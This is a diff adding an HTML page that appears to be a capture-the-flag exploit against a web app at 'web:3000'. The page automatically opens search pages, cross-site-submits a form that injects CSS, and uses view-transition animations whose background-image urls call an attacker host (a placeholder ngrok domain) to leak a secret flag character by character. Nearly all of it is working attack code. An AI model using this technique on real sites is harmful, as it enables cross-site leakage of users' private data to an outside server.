@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<body>
+</body>
+<script>
+let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVXYZ{}0123456789_";
+let known = "IERAE{";
+const NGROK = "something something something"
+async function leakChar(guess) {
+	// Based on MDN example
+	let ST = `
+@view-transition {
+  navigation: auto;
+}
+body::view-transition(site-title) {
+  animation-duration: 1s;
+}
+@keyframes move-out {
+    from {
+    	background-image: url(//${NGROK}/leak/${guess});
+        transform: translateY(0%);
+    }
+
+    to {
+        transform: translateY(1%);
+  	background-image: url(//${NGROK}/leak/${guess});
+    }
+    background-image: url(//${NGROK}/leak/${guess});
+}
+
+::view-transition-old(root) {
+    animation: 0.4s ease-in both move-out;
+
+}
+::view-transition-new(root) {
+    animation: 0.4s ease-in both move-in;
+}
+
+`
+	let z = window.open("http://web:3000/?search=" + guess, guess);
+	let el = document.createElement("form");
+	el.action = "http://web:3000/create";
+	el.method = "post";
+	el.target = guess;
+	let f1 = document.createElement("input");
+	f1.name = "title";
+	f1.value = "a";
+	f1.type = "text";
+	el.appendChild(f1);
+	f1 = document.createElement("input");
+	f1.name = "body";
+	f1.value = "a";
+	f1.type = "text";
+	el.appendChild(f1);
+	f1 = document.createElement("input");
+	f1.name = "style";
+	f1.value = ST;
+	f1.type = "text";
+	el.appendChild(f1);
+	document.body.appendChild(el);
+	await new Promise(r => setTimeout(r, 50));
+	el.submit();
+	await new Promise(r => setTimeout(r, 100));
+	z.close();
+}
+async function go() {
+	while(chars.length > 1) {
+		known = await fetch("/known");
+		known = await known.text();
+		for(let c of chars) {
+			await leakChar(known + c);
+			await new Promise(r => setTimeout(r, 100));
+		}
+		chars = await fetch("/chars");
+		chars = await chars.text();
+	}
+}
+go();
+</script>
